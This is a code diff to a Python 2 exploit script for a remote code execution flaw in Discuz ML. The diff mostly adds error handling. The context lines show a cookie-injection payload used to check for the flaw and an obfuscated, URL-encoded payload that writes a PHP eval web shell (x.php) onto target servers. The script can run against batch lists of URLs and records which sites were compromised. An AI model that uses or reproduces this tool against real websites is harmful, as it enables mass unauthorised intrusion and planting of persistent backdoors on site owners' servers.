@@ -48,6 +48,7 @@ def get_setcookie_language_value(tgtUrl,timeout):
 
     except:
         print str(tgtUrl) + ' get setcookie language value error!'
+        return 'get-setcookie-language-value-error'
 
 
 def dz_ml_rce_check(tgtUrl, setcookie_language_value, timeout):
@@ -162,6 +163,12 @@ def dz_ml_rce_check_batch(timeout,f4success,f4fail):
         print 'Checking: ' + tgtUrl + ' ---[' + str(total_count - qcount) + '/' + str(total_count) + ']'
 
         setcookie_language_value = get_setcookie_language_value(tgtUrl,timeout)
+        if setcookie_language_value == 'get-setcookie-language-value-error':
+            lock.acquire()
+            f4fail.write(tgtUrl + ': ' + 'get setcookie language value error' + '\n')
+            lock.release()
+            continue
+
         check_payload = str(setcookie_language_value) + '\'.phpinfo().\';'
         headers["Cookie"] = check_payload;
 
@@ -235,6 +242,13 @@ def dz_ml_rce_getshell_batch(timeout,f4success,f4fail):
         print 'Checking: ' + tgtUrl + ' ---[' + str(total_count - qcount) + '/' + str(total_count) + ']'
 
         setcookie_language_value = get_setcookie_language_value(tgtUrl,timeout)
+        if setcookie_language_value == 'get-setcookie-language-value-error':
+            lock.acquire()
+            f4fail.write(tgtUrl + ': ' + 'get setcookie language value error' + '\n')
+            lock.release()
+            continue
+
+
         getshell_exp = '\'.file_put_contents%28%27x.php%27%2Curldecode%28%27%253c%253fphp%2520@eval%28%2524_%25%35%30%25%34%66%25%35%33%25%35%34%255b%2522x%2522%255d%29%253b%253f%253e%27%29%29.\';'
         getshell_exp_send = setcookie_language_value + getshell_exp
         headers["Cookie"] = getshell_exp_send
@@ -308,13 +322,24 @@ def main():
     timeout = options.timeout
     tgtUrl = options.tgtUrl
 
-    setcookie_language_value = get_setcookie_language_value(tgtUrl,timeout)
+
+    global total_count
 
     if tgtUrl and (getshell is None and cmdshell is None):
+        setcookie_language_value = get_setcookie_language_value(tgtUrl, timeout)
+        if setcookie_language_value == 'get-setcookie-language-value-error':
+            sys.exit()
+        #print setcookie_language_value
         dz_ml_rce_check(tgtUrl, setcookie_language_value, timeout)
     if tgtUrl and cmdshell:
+        setcookie_language_value = get_setcookie_language_value(tgtUrl, timeout)
+        if setcookie_language_value == 'get-setcookie-language-value-error':
+            sys.exit()
         dz_ml_rce_cmdshell(tgtUrl, setcookie_language_value, timeout)
     if tgtUrl and getshell:
+        setcookie_language_value = get_setcookie_language_value(tgtUrl, timeout)
+        if setcookie_language_value == 'get-setcookie-language-value-error':
+            sys.exit()
         dz_ml_rce_getshell(tgtUrl, setcookie_language_value, timeout)
 
     if options.tgtUrlsPath and (getshell is None):
@@ -325,7 +350,7 @@ def main():
         f4success = open('batch_result/' + str(nowtime) + '/' + 'success-checked.txt', 'w')
         f4fail = open('batch_result/' + str(nowtime) + '/' + 'failed-checked.txt', 'w')
         urlsFile = open(tgtFilePath)
-        global total_count
+
         total_count = len(open(tgtFilePath, 'rU').readlines())
 
         print '===Total ' + str(total_count) + ' urls==='
@@ -353,7 +378,7 @@ def main():
         f4success = open('batch_result/' + str(nowtime) + '/' + 'success-getshell.txt', 'w')
         f4fail = open('batch_result/' + str(nowtime) + '/' + 'failed-getshell.txt', 'w')
         urlsFile = open(tgtFilePath)
-        global total_count
+        #global total_count
         total_count = len(open(tgtFilePath, 'rU').readlines())
 
         print '===Total ' + str(total_count) + ' urls==='
